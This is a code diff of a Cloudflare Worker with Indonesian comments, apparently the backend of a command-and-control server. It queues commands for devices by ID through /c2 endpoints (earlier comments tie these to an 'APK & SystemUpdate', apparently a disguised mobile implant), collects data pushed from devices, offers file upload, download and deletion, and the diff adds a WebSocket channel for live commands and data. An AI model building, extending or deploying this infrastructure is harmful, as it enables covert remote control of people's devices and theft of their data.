@@ -1,5 +1,5 @@
 // ================================================================
-// Cloudflare Worker - verifikasi-api (VERSI FIXED & CLEAN)
+// Cloudflare Worker - verifikasi-api (VERSI FIXED & CLEAN + WS)
 // ================================================================
 
 // ============================================================
@@ -49,7 +49,7 @@ function unauthorizedResponse() {
 }
 
 // ============================================================
-// RATE LIMITING (FIXED - MEMASTIKAN ANGKA)
+// RATE LIMITING
 // ============================================================
 async function checkRateLimit(env, key) {
   const now = Date.now();
@@ -57,8 +57,7 @@ async function checkRateLimit(env, key) {
   
   try {
     const raw = await env.DATA.get(windowKey);
-    // PERBAIKAN: Pastikan selalu string, jika null jadi '0'
-    const count = parseInt(raw || '0', 10); 
+    const count = parseInt(raw || '0', 10);
     
     if (count >= CONFIG.RATE_LIMIT) {
       return { allowed: false, retryAfter: CONFIG.RATE_WINDOW };
@@ -93,16 +92,12 @@ export default {
     const url = new URL(request.url);
     const method = request.method;
     
-    // ============================================================
     // OPTIONS - CORS Preflight
-    // ============================================================
     if (method === 'OPTIONS') {
       return new Response(null, { headers: CORS });
     }
 
-    // ============================================================
     // RATE LIMITING
-    // ============================================================
     const clientIP = request.headers.get('CF-Connecting-IP') || 'unknown';
     const rateCheck = await checkRateLimit(env, clientIP);
     if (!rateCheck.allowed) {
@@ -112,10 +107,15 @@ export default {
       }, 429);
     }
 
+    // ============================================================
+    // WEBSOCKET - /ws (TAMBAHKAN DI SINI)
+    // ============================================================
+    if (url.pathname === '/ws') {
+      return handleWebSocket(request, env);
+    }
+
     try {
-      // ============================================================
       // GET / - Health Check
-      // ============================================================
       if (url.pathname === '/' && method === 'GET') {
         const raw = await env.DATA.get('data');
         const data = raw ? JSON.parse(raw) : [];
@@ -128,116 +128,82 @@ export default {
         });
       }
 
-      // ============================================================
-      // POST /data - Terima data (dengan validasi)
-      // ============================================================
+      // POST /data
       if ((url.pathname === '/data' || url.pathname === '/api/data') && method === 'POST') {
         return await handlePostData(request, env);
       }
 
-      // ============================================================
-      // POST /batch - Batch data
-      // ============================================================
+      // POST /batch
       if ((url.pathname === '/batch' || url.pathname === '/api/batch') && method === 'POST') {
         return await handleBatchData(request, env);
       }
 
-      // ============================================================
-      // GET /data - Lihat data (dengan pagination & filter)
-      // ============================================================
+      // GET /data
       if ((url.pathname === '/data' || url.pathname === '/api/data') && method === 'GET') {
         return await handleGetData(request, env);
       }
 
-      // ============================================================
-      // GET /stats - Statistik
-      // ============================================================
+      // GET /stats
       if (url.pathname === '/stats' && method === 'GET') {
         return await handleStats(request, env);
       }
 
-      // ============================================================
-      // POST /clear - Hapus Data
-      // ============================================================
+      // POST /clear
       if (url.pathname === '/clear' && method === 'POST') {
         return await handleClear(request, env);
       }
 
-      // ============================================================
-      // POST /delete - Hapus data spesifik
-      // ============================================================
+      // POST /delete
       if (url.pathname === '/delete' && method === 'POST') {
         return await handleDelete(request, env);
       }
 
-      // ============================================================
-      // GET /c2 - C2 Command (untuk APK & SystemUpdate)
-      // ============================================================
+      // GET /c2
       if (url.pathname === '/c2' && method === 'GET') {
         return await handleC2(request, env);
       }
 
-      // ============================================================
-      // POST /c2 - Kirim C2 Command
-      // ============================================================
+      // POST /c2
       if (url.pathname === '/c2' && method === 'POST') {
         return await handleC2Post(request, env);
       }
 
-      // ============================================================
-      // GET /c2/history - C2 History
-      // ============================================================
+      // GET /c2/history
       if (url.pathname === '/c2/history' && method === 'GET') {
         return await handleC2History(request, env);
       }
 
-      // ============================================================
-      // GET /api/files - List File
-      // ============================================================
+      // GET /api/files
       if (url.pathname === '/api/files' && method === 'GET') {
         return await handleListFiles(request, env);
       }
 
-      // ============================================================
-      // GET /api/download - Download File
-      // ============================================================
+      // GET /api/download
       if (url.pathname === '/api/download' && method === 'GET') {
         return await handleDownloadFile(request, env);
       }
 
-      // ============================================================
-      // POST /api/upload - Upload File
-      // ============================================================
+      // POST /api/upload
       if (url.pathname === '/api/upload' && method === 'POST') {
         return await handleUploadFile(request, env);
       }
 
-      // ============================================================
-      // POST /api/delete - Delete File
-      // ============================================================
+      // POST /api/delete
       if (url.pathname === '/api/delete' && method === 'POST') {
         return await handleDeleteFile(request, env);
       }
 
-      // ============================================================
-      // POST /error - Log Error
-      // ============================================================
+      // POST /error
       if (url.pathname === '/error' && method === 'POST') {
         return await handleError(request, env);
       }
 
-      // ============================================================
-      // 404 - Not Found
-      // ============================================================
+      // 404
       return errorResponse('Not Found', 404);
       
     } catch (error) {
-      // ============================================================
-      // GLOBAL ERROR HANDLER
-      // ============================================================
       console.error('Worker Error:', error);
       
-      // Log error ke KV
       try {
         const errorLog = await env.DATA.get('error_log') || '[]';
         const logs = JSON.parse(errorLog);
@@ -267,7 +233,6 @@ async function handlePostData(request, env) {
   try {
     const body = await request.json();
     
-    // Validasi input
     if (!body || typeof body !== 'object') {
       return errorResponse('Invalid request body');
     }
@@ -280,16 +245,13 @@ async function handlePostData(request, env) {
       userAgent: request.headers.get('User-Agent') || 'unknown',
     };
     
-    // Jika ini perintah C2 dari dashboard
     if (d.sumber === 'c2_command') {
       const cmdData = d.data;
       cmdData.timestamp = Date.now();
       cmdData.status = 'pending';
       
-      // Simpan perintah
       await env.DATA.put('perintah', JSON.stringify(cmdData));
       
-      // Simpan history C2
       const historyRaw = await env.DATA.get('c2_history') || '[]';
       const history = JSON.parse(historyRaw);
       history.push({
@@ -308,11 +270,9 @@ async function handlePostData(request, env) {
       });
     }
     
-    // Data biasa - simpan ke KV
     const raw = await env.DATA.get('data') || '[]';
     let data = JSON.parse(raw);
     
-    // Limit data
     if (data.length >= CONFIG.MAX_DATA) {
       data = data.slice(-CONFIG.MAX_DATA + 1);
     }
@@ -332,7 +292,7 @@ async function handlePostData(request, env) {
 }
 
 // ============================================================
-// HANDLER: POST /batch (Batch Data)
+// HANDLER: POST /batch
 // ============================================================
 async function handleBatchData(request, env) {
   try {
@@ -380,22 +340,19 @@ async function handleBatchData(request, env) {
 }
 
 // ============================================================
-// HANDLER: GET /data (dengan Pagination & Filter)
+// HANDLER: GET /data
 // ============================================================
 async function handleGetData(request, env) {
-  // Auth
   if (!isAuthenticated(request, env)) {
     return unauthorizedResponse();
   }
   
   const url = new URL(request.url);
   
-  // C2 Command
   if (url.searchParams.get('type') === 'perintah') {
     try {
       const perintah = await env.DATA.get('perintah');
       if (perintah) {
-        // Update status di history
         try {
           const historyRaw = await env.DATA.get('c2_history') || '[]';
           const history = JSON.parse(historyRaw);
@@ -432,18 +389,15 @@ async function handleGetData(request, env) {
     }
   }
   
-  // Data biasa - dengan pagination
   try {
     const raw = await env.DATA.get('data') || '[]';
     let data = JSON.parse(raw);
     
-    // Filter by source
     const source = url.searchParams.get('source');
     if (source) {
       data = data.filter(item => item.sumber === source);
     }
     
-    // Filter by search
     const search = url.searchParams.get('search');
     if (search) {
       const s = search.toLowerCase();
@@ -453,7 +407,6 @@ async function handleGetData(request, env) {
       });
     }
     
-    // Sort (FIXED: mengubah objek Date menjadi angka milidetik .getTime())
     const sort = url.searchParams.get('sort') || 'newest';
     if (sort === 'newest') {
       data.sort((a, b) => new Date(b.waktu).getTime() - new Date(a.waktu).getTime());
@@ -463,7 +416,6 @@ async function handleGetData(request, env) {
       data.sort((a, b) => (a.sumber || '').localeCompare(b.sumber || ''));
     }
     
-    // Pagination
     const page = parseInt(url.searchParams.get('page')) || 1;
     const limit = Math.min(parseInt(url.searchParams.get('limit')) || 50, 200);
     const total = data.length;
@@ -502,10 +454,8 @@ async function handleStats(request, env) {
       stats[source] = (stats[source] || 0) + 1;
     });
     
-    // Data terbaru
     const latest = data.length > 0 ? data[data.length - 1] : null;
     
-    // Range waktu (FIXED: menggunakan .getTime() dan validasi array kosong)
     let timeRange = { first: null, last: null };
     if (data.length > 0) {
       const times = data.map(d => new Date(d.waktu).getTime()).filter(t => !isNaN(t));
@@ -555,10 +505,8 @@ async function handleClear(request, env) {
         source: source,
       });
     } else {
-      // Hapus semua data
       await env.DATA.delete('data');
       await env.DATA.delete('perintah');
-      // Jangan hapus c2_history, error_log, files
       return jsonResponse({
         status: 'ok',
         message: 'All data cleared',
@@ -572,7 +520,7 @@ async function handleClear(request, env) {
 }
 
 // ============================================================
-// HANDLER: POST /delete (Delete spesifik data)
+// HANDLER: POST /delete
 // ============================================================
 async function handleDelete(request, env) {
   if (!isAuthenticated(request, env)) {
@@ -596,7 +544,6 @@ async function handleDelete(request, env) {
       data.splice(index, 1);
       deleted = true;
     } else if (id !== undefined) {
-      // Cari berdasarkan ID (waktu)
       data = data.filter(item => {
         const itemId = item.waktu || item.id;
         if (itemId === id) {
@@ -624,23 +571,20 @@ async function handleDelete(request, env) {
 }
 
 // ============================================================
-// HANDLER: GET /c2 - C2 Command (untuk APK & SystemUpdate)
+// HANDLER: GET /c2
 // ============================================================
 async function handleC2(request, env) {
   try {
     const url = new URL(request.url);
     const deviceId = url.searchParams.get('device') || 'unknown';
     
-    // Cek apakah ada perintah untuk device ini
     const perintah = await env.DATA.get('perintah');
     if (perintah) {
       const cmd = JSON.parse(perintah);
       
-      // Jika perintah untuk device tertentu atau all
       if (!cmd.device || cmd.device === 'all' || cmd.device === deviceId) {
         await env.DATA.delete('perintah');
         
-        // Log
         const logRaw = await env.DATA.get('c2_history') || '[]';
         const log = JSON.parse(logRaw);
         log.push({
@@ -679,7 +623,7 @@ async function handleC2(request, env) {
 }
 
 // ============================================================
-// HANDLER: POST /c2 - Kirim C2 Command (dari dashboard)
+// HANDLER: POST /c2
 // ============================================================
 async function handleC2Post(request, env) {
   if (!isAuthenticated(request, env)) {
@@ -699,7 +643,6 @@ async function handleC2Post(request, env) {
     
     await env.DATA.put('perintah', JSON.stringify(cmd));
     
-    // Log
     const logRaw = await env.DATA.get('c2_history') || '[]';
     const log = JSON.parse(logRaw);
     log.push({
@@ -724,7 +667,7 @@ async function handleC2Post(request, env) {
 }
 
 // ============================================================
-// HANDLER: GET /c2/history - C2 History
+// HANDLER: GET /c2/history
 // ============================================================
 async function handleC2History(request, env) {
   if (!isAuthenticated(request, env)) {
@@ -741,7 +684,7 @@ async function handleC2History(request, env) {
 }
 
 // ============================================================
-// HANDLER: GET /api/files - List Files
+// HANDLER: GET /api/files
 // ============================================================
 async function handleListFiles(request, env) {
   if (!isAuthenticated(request, env)) {
@@ -752,11 +695,8 @@ async function handleListFiles(request, env) {
     const url = new URL(request.url);
     const path = url.searchParams.get('path') || '/';
     
-    // Simulasi file system (gunakan KV)
     const filesRaw = await env.DATA.get('files_list') || '[]';
     const files = JSON.parse(filesRaw);
-    
-    // Filter berdasarkan path
     const filtered = files.filter(f => f.path.startsWith(path));
     
     return jsonResponse(filtered);
@@ -767,7 +707,7 @@ async function handleListFiles(request, env) {
 }
 
 // ============================================================
-// HANDLER: GET /api/download - Download File
+// HANDLER: GET /api/download
 // ============================================================
 async function handleDownloadFile(request, env) {
   if (!isAuthenticated(request, env)) {
@@ -805,7 +745,7 @@ async function handleDownloadFile(request, env) {
 }
 
 // ============================================================
-// HANDLER: POST /api/upload - Upload File
+// HANDLER: POST /api/upload
 // ============================================================
 async function handleUploadFile(request, env) {
   if (!isAuthenticated(request, env)) {
@@ -836,7 +776,6 @@ async function handleUploadFile(request, env) {
     const fileKey = `file_${path}${file.name}`;
     await env.DATA.put(fileKey, JSON.stringify(fileData));
     
-    // Update files list
     const filesRaw = await env.DATA.get('files_list') || '[]';
     const files = JSON.parse(filesRaw);
     files.push({
@@ -860,7 +799,7 @@ async function handleUploadFile(request, env) {
 }
 
 // ============================================================
-// HANDLER: POST /api/delete - Delete File
+// HANDLER: POST /api/delete
 // ============================================================
 async function handleDeleteFile(request, env) {
   if (!isAuthenticated(request, env)) {
@@ -878,7 +817,6 @@ async function handleDeleteFile(request, env) {
     const fileKey = `file_${path}`;
     await env.DATA.delete(fileKey);
     
-    // Update files list
     const filesRaw = await env.DATA.get('files_list') || '[]';
     const files = JSON.parse(filesRaw);
     const filtered = files.filter(f => f.path !== path);
@@ -895,7 +833,7 @@ async function handleDeleteFile(request, env) {
 }
 
 // ============================================================
-// HANDLER: POST /error - Log Error
+// HANDLER: POST /error
 // ============================================================
 async function handleError(request, env) {
   try {
@@ -915,4 +853,87 @@ async function handleError(request, env) {
   } catch(e) {
     return jsonResponse({ status: 'ok' });
   }
+}
+
+// ============================================================
+// HANDLER: WebSocket (TAMBAHKAN DI SINI)
+// ============================================================
+async function handleWebSocket(request, env) {
+  const upgradeHeader = request.headers.get('Upgrade');
+  if (!upgradeHeader || upgradeHeader !== 'websocket') {
+    return new Response('Expected Upgrade: websocket', { status: 426 });
+  }
+
+  const webSocketPair = new WebSocketPair();
+  const [client, server] = Object.values(webSocketPair);
+
+  server.accept();
+
+  let authenticated = false;
+  let deviceId = 'unknown';
+
+  server.addEventListener('message', async (event) => {
+    try {
+      const data = JSON.parse(event.data);
+      
+      if (data.type === 'auth') {
+        if (data.key === env.PASSWORD) {
+          authenticated = true;
+          deviceId = data.deviceId || 'unknown';
+          server.send(JSON.stringify({ type: 'auth_success' }));
+          console.log('✅ WS Authenticated:', deviceId);
+        } else {
+          server.send(JSON.stringify({ type: 'auth_failed' }));
+          server.close(1008, 'Auth failed');
+        }
+        return;
+      }
+
+      if (!authenticated) {
+        server.close(1008, 'Unauthorized');
+        return;
+      }
+
+      if (data.type === 'command') {
+        await env.DATA.put('perintah', JSON.stringify(data.command));
+        server.send(JSON.stringify({
+          type: 'command_received',
+          command: data.command.aksi
+        }));
+      }
+
+      if (data.type === 'ping') {
+        server.send(JSON.stringify({
+          type: 'pong',
+          timestamp: data.timestamp
+        }));
+      }
+
+      if (data.type === 'data') {
+        const raw = await env.DATA.get('data') || '[]';
+        let allData = JSON.parse(raw);
+        allData.push({
+          waktu: new Date().toISOString(),
+          sumber: 'websocket',
+          data: data.data,
+          deviceId: deviceId
+        });
+        if (allData.length > 5000) allData = allData.slice(-5000);
+        await env.DATA.put('data', JSON.stringify(allData));
+        server.send(JSON.stringify({ type: 'data_saved' }));
+      }
+
+    } catch(e) {
+      server.send(JSON.stringify({ type: 'error', message: e.message }));
+    }
+  });
+
+  server.addEventListener('close', () => {
+    console.log('❌ WS Closed:', deviceId);
+  });
+
+  return new Response(null, {
+    status: 101,
+    webSocket: client,
+  });
 }
